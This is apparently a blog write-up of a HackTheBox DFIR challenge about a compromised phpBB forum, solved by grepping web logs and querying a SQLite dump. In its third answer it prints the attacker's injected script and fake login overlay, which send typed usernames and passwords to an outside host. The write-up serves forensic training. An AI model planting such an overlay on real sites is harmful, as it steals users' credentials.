---
title: "HTB Sherlock: Bumblebee"
seoTitle: "HTB Sherlock: Bumblebee Write-up"
seoDescription: "Grepping network logs and SQLite querying. Write-up for HackTheBox Sherlock challenge."
datePublished: Fri Mar 29 2024 08:00:28 GMT+0000 (Coordinated Universal Time)
cuid: clucdix5v000c08l29x6ye8fg
slug: htb-sherlock-bumblebee
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1710869695133/60c3aa02-866f-467f-80ca-7669cce8667b.png
tags: sqlite, grep, ethical-hacking, htb, dfir, sqlite3

---

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">This write-up is a part of the <a target="_blank" rel="noopener noreferrer nofollow" href="https://blog.cyberethical.me/series/htb-sherlocks" style="pointer-events: none">HTB Sherlocks series</a>. Sherlocks are investigative challenges that test defensive security skills. I encourage you to try them out if you like digital forensics, incident response, post-breach analysis and malware analysis. <a target="_blank" rel="noopener noreferrer nofollow" href="https://affiliate.hackthebox.com/sherlocks2352" style="pointer-events: none">Are you ready to start the investigation?</a></div>
</div>

# Incident Details

Name: [Bumblebee](https://affiliate.hackthebox.com/sherlocks-bumblebee)  
Category: DFIR  
Difficulty: Easy ([*Solved*](https://labs.hackthebox.com/achievement/sherlock/555018/554))

> An external contractor has accessed the internal forum here at Forela via the Guest WiFi and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

%%[support-cta] 

# Evidences

> All evidence files are marked as readonly right after acquiring and their hash (sha256) is written down. Read-only attribute does not affect the hash of a file.

01: ZIP archive, password protected (`hacktheblue`)

```plaintext
$ bumblebee.zip
aa2f772a208f4bec24e99242b541b95302175a0960f326d107f5bfddbcf61775
```

02: gzip compressed data

```plaintext
$ bumblebee.zip/incident.tgz
58bf64aeabde58d057ef690c3f41aed48fdcafc3c81e3382df95c34ad1f51a24
```

03: POSIX tar archive

```plaintext
$ bumblebee.zip/incident.tgz/incident.tar
6822ffb99b274523f741d37236f018b0ef6b1b945d9a92d88ba9911d2ca26869
```

04: ASCII text

```plaintext
bumblebee.zip/.../access.log
43ca54b7fce36f772d8e0705625b2f54eaf91a3d32e71d342b1c4af7a16ce577
```

05: SQLite 3.x database

```plaintext
bumblebee.zip/.../phpbb.sqlite3
ec7579dbe5435f1972a44d462a8dd0b76db994be4eb5f68b5c3622164418940f
```

# Analysis

Customer provided the logs from web server (forum) and a database file (SQLite3). Name of the databse file and some requests in logs suggest that the forum was [phpBB](https://www.phpbb.com/) running on the PHP engine.

## `access.log`

Consists only with GET/POST requests with few repetitions of OPTIONS:

```plaintext
::1 - - [25/Apr/2023:15:52:40 +0100] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.56 (Debian) (internal dummy connection)"
```

Shoting blindly with some potential RCEs

```plaintext
grep -iE "(sh|cmd|exec)" access.log | grep -ivE "(macintosh|sheet)
```

Checking for some unusual requests.

```plaintext
grep -E "(DELETE,PUT)" access.log
```

## Questions

In this scenario we have 10 questions to answer.

1. What was the username of the external contractor?
    

Grepping the logs for "username", "user", "login", "sign" returns nothing useful at the moment, so I'm looking into the database file.

```plaintext
$ sqlite -readonly phpbb.sqlite3
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869146907/88c8f6d1-a4ba-43bd-bc08-9dca872de047.png align="center")

```plaintext
sqlite> .output db/phpbb_log.sql
sqlite> .dump phpbb_log
sqlite> .output db/phpbb_users.sql
sqlite> .dump phpbb_users
```

At database we can see two users with a mail domain '@contractor.net'. I have no idea which one is the contractor in question but nevertheless one of the usernames is the correct answer.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869164442/6657935b-b6bb-40f8-89ef-526ab037ffd3.png align="center")

2. What IP address did the contractor use to create their account?
    

This can be found in `phpbb_logs` table, with action `LOG_USERS_ADDED`.

3. ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869193324/34844add-62ab-406b-8095-8254d1c9a704.png align="center")
    
    What is the post\_id of the malicious post that the contractor made?
    

Ah, so the contractor was the one who compromised the administrator account. I thougth that "they" meant owners of that Guest WiFi, but ok.

Grepping `access.log` for `post_id` returns nothing. Dumping php table:

```plaintext
sqlite> .output db/phpbb_posts.sql
sqlite> .dump phpbb_posts
```

Fortunatelly there are not really must post there. Malicious post with cookie stealing injection is there.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869220909/6017461a-1969-4846-956b-09ab2510e117.png align="center")

Injected form (pruned of unnecessary elements) is below.

```html
<div>
    //...
    <script type="text/javascript">
        function sethidden() {
            const d = new Date()
            d.setTime(d.getTime() + 24 * 60 * 60 * 1000)
            let expires = 'expires=' + d.toUTCString()
            document.cookie = 'phpbb_token=1;' + expires + ';'
            var modal = document.getElementById('zbzbz1234')
            modal.classList.add('hidden')
        }
        document.addEventListener('DOMContentLoaded', function (event) {
            let cookieexists = false
            let name = 'phpbb_token='
            let cookies = decodeURIComponent(document.cookie)
            let ca = cookies.split('; ')
            for (let i = 0; i < ca.length; i++) {
                let c = ca[i]
                while (c.charAt(0) == ' ') {
                    c = c.substring(1)
                }
                if (c.indexOf(name) == 0) {
                    cookieexists = true
                }
            }
            if (cookieexists) {
                return
            }
            var modal = document.getElementById('zbzbz1234')
            modal.classList.remove('hidden')
        })
    </script>
    //...
    <div class="modal hidden" id="zbzbz1234" onload="shouldshow">
        <div id="wrap" class="wrap"> <a id="top" class="top-anchor" accesskey="t"></a>
            <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username"
                target="hiddenframe">
                <div class="panel">
                    <div class="inner">
                        <div class="content">
                            <h2 class="login-title">Login</h2>
                            <fieldset class="fields1">
                                <dl>
                                    <dt><label for="username">Username:</label></dt>
                                    <dd><input type="text" tabindex="1" name="username" id="username" size="25"
                                            value="" class="inputbox autowidth"></dd>
                                </dl>
                                <dl>
                                    <dt><label for="password">Password:</label></dt>
                                    <dd><input type="password" tabindex="2" id="password" name="password" size="25"
                                            class="inputbox autowidth" autocomplete="off"></dd>
                                </dl>
                                <dl>
                                    <dd><label for="autologin"><input type="checkbox" name="autologin"
                                                id="autologin" tabindex="4">Remember me</label></dd>
                                    <dd><label for="viewonline"><input type="checkbox" name="viewonline"
                                                id="viewonline" tabindex="5">Hide my online status this
                                            session</label></dd>
                                </dl>
                                <dl>
                                    <dt>&nbsp;</dt>
                                    <dd> <input type="submit" name="login" tabindex="6" value="Login"
                                            class="button1" onclick="sethidden()"></dd>
                                </dl>
                            </fieldset class="fields1">
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
```

CSS styling used to "override" the browser content:

```css
.modal {
    position: fixed;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    z-index: 101;
    background-color: white;
    opacity: 1;
}
```

When someone enters credentials and tries to sing-in, username and password were redirected to the php script attacker controls:

`<form action="http://10.10.0.78/update.php" method="post" ...`

4. What is the full URI that the credential stealer sends its data to?
    

**Answer**: `http://10.10.0.78/update.php`

5. When did the contractor log into the forum as the administrator? (UTC)
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869268098/552f53e0-8ca9-4f45-be52-e8eea2981c6e.png align="center")
    
6. In the forum there are plaintext credentials for the LDAP connection, what is the password?
    

There is a [plugin added to the phpBB](https://github.com/rokx/phpbb_ext_db_or_ldap) that enabled LDAP connections, so let't try grepping config for the hope that LDAP connection details are stored there.

```plaintext
$ sqlite3 phpbb.sqlite3 ".dump phpbb_config" | grep -i ldap
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869289556/c2063587-ea8f-4b69-b4b4-67ed49272254.png align="center")

7. What is the user agent of the Administrator user?
    

User agents are listed in the `access.log`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869303419/2bf08a30-0ca1-4406-8f01-ff681f685981.png align="center")

8. What time did the contractor add themselves to the Administrator group? (UTC)
    

Returning to the `phpbb_logs` table.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869318978/a1ff8ed4-084e-4a87-ba41-37405299e3fa.png align="center")

```plaintext
date -u -d @1682506431 "+%d/%m/%Y %H:%M:%S"
```

9. What time did the contractor download the database backup? (UTC)
    

Again, `access.log`

```plaintext
$ grep -iE "(.sql.)" access.log
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1710869333722/3429390c-1fd0-4feb-bdb9-4d1e01f98e7c.png align="center")

10. What was the size in bytes of the database backup as stated by access.log?
    

Size is in the same line as previous answer.

**Answer**: `34707`

# Data Recovery

None required.

# Lessons Learned

* Grepping `sqlite3` outputs (`sqlite3 [dbfile] ".dump ..." | grep ...`)
    
* Converting Unix timestamp to UTC (`date -u -d @1682506431 "+%d/%m/%Y %H:%M:%S"`)
    

# Additional readings

%%[follow-cta] 

* [NIST Computer Security Incident Handling Guide](https://www.nist.gov/privacy-framework/nist-sp-800-61)